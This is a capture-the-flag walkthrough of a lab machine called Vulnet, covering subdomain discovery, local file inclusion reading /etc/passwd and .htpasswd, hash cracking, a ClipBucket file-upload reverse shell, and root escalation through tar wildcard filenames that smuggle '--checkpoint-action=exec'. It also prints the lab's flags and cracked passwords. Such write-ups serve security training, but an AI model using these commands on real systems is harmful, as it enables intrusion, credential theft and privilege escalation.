# Vulnet<br>
IP: 10.10.180.218 <br> Difficulty: Medium<br>

## Enumeration

Saved the IP in hosts file with vulnet.thm name.
Scanned the IP with rustscan and got 2 port open: 22, 80
Started a gobuster scan on the URL but got nothing.
Then started a subdomain scan using gobuster:

```
gobuster vhost -u http://vulnet.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

Got two sub-domains:

```
gc._msdcs.vulnet.thm
broadcast.vulnet.thm
```

The 2nd one was valid. But it was a HTTP login form. But I had no correct creds.

Now I began to enumerate source code and found an intresting piece of code in /js/index__d8338055.js.

```
http://vulnnet.thm/index.php?referer=",n(n.s=0)}
```

It takes a referer parameter. So I tried to perform LFI.

```
http://vulnnet.thm/index.php?referer=/etc/passwd
```

And it gave passwd file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

There are two users: root and server-management.

Since we got HTTP login page, its credentials are defaultly present in /etc/apache2/.htpasswd file.

```
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
```

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

I cracked the hash with john.

```
developers:9972761drmfsls
```

Logged into the website using these creds and found that the web-server was using clipBucket. 
Searched for any available exploits on searchsploit and found that there is arbitrary file upload vulnerability.

```
curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/photo_uploader.php"
```

Uploaded a reverse shell using this command. This was uploaded in http://broadcast.vulnnet.thm/files/photos. Got a reverse shell.

## User.txt

Got mysql credentials in /var/www/html/includes/dbconnect.php.

```
admin:VulnNetAdminPass0990
```

But got nothing interesting in it.
There were many backup files in /var/backups owned by root and server-management.
But there was a file ssh-backups.tar.gz owned by server-management. Transferred this file into my machine and extracted the id_rsa.

```
tar xvf ssh-backups.tar.gz
```

Got an encrypted id_rsa file.
Used ssh2john and then john to crack the id_rsa.

```
id_rsa: oneTWO3gOyac
```

ssh into machine as server-management.
User.txt was in his home.

```
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

## Root.txt

There was a cronjob running as root which was backing up files from server-management/Documents using tar command.

We can escalate our privellege by creating some files in this directory.

```
echo "chmod +s /bin/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```

After the cronjob takes action, the /bin/bash will have setUID bit on.

To escalate privellege:

```
/bin/bash -p
```

```
THM{220b671dd8adc301b34c2738ee8295ba}
```
